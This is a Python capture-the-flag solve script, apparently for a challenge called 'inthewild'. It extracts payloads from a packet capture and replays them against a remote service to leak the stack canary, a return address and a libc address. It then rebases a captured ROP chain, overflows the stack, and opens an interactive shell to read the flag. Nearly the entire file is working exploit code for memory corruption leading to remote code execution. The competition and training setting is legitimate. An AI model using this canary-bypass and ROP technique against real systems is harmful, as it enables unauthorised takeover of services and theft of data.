from pwn import *
import pyshark
import time 


if len(sys.argv) < 3:
    print("Usage solve.py <host> <port>")
    exit(1)
_, host, port = sys.argv

pcap_file = '../dist/inthewild.pcap'
capture = pyshark.FileCapture(pcap_file)

i = 0
payloads = []
info("Get send payloads")
for packet in capture:
    if packet.transport_layer == "TCP":
        try :
            data = bytes.fromhex(packet.tcp.payload.replace(':', ''))
            print(data)
            if i % 2 == 0:
                payloads.append(data)
            if i == 5:
                leak_libc_pcap = data
            if i == 6:
                rop_payload = data
            i+=1
        except:
            continue

print("------------------")
#print(payloads)

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val): info(name+" = %#x" % val)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(delim): return io.recvuntil(delim)
def rcv(number): return io.recv(number)
def rcvl(): return io.recvline()

def conn():
    global io
    io = remote(host, int(port))
    return io

info("Leak canary")
conn()

sl(payloads[0][:-1])
pad = len(payloads[0])-1

leak = io.recv(3000)
#print(leak)
canary = unpack(leak[pad:pad+8],"all")
canary &= 0xffffffffffffff00

logleak("Canary",canary)

io.close()

info("Leak ret address")
conn()

sl(payloads[1][:-1])
pad = len(payloads[1])-1

leak = io.recv(3000)
#print(leak)
leak = unpack(leak[pad+1:pad+9],"all")

logleak("ret address",leak)

io.close()

info("Leak libc address")
conn()

sl(payloads[2][:-1])
pad = len(payloads[2])-1

leak = io.recv(3000)
#print(leak)
leak_libc = unpack(leak[pad+1:pad+9],"all")

logleak("libc address",leak_libc)
io.close()

leak_libc_pcap = unpack(leak_libc_pcap[-6:],"all")
logleak("libc address pcap",leak_libc_pcap)

info("Disecting rop payload")
pad = rop_payload.count(b'A')
info(f"Padding is {str(pad)}")
rop_payload = rop_payload.replace(b"A",b"")
print(rop_payload)

rop = []
for i in range(0,len(rop_payload),8):
    data = unpack(rop_payload[i:i+8],"all")
    #print(hex(data))
    if "0x7f23" in hex(data):
        if leak_libc_pcap > data: # Here calculate difference between leak libc pcap and the rop of the pcap to do same difference with our leak
            diff = leak_libc_pcap - data 
            to_add = leak_libc - diff
        else:
            diff = data - leak_libc_pcap
            to_add = leak_libc + diff
        #print(hex(to_add))
    else:
        to_add = data
    rop.append(to_add)

rop.pop(0) # remove pcap canary

pld = pad * b'A'
pld += p64(canary)
for i in rop:
    #print(hex(i))
    pld += p64(i)

info("Get this shell")
conn()
sl(pld)

io.recv(3000)
time.sleep(1)
io.sendline(b"cat /flag*")
io.interactive()


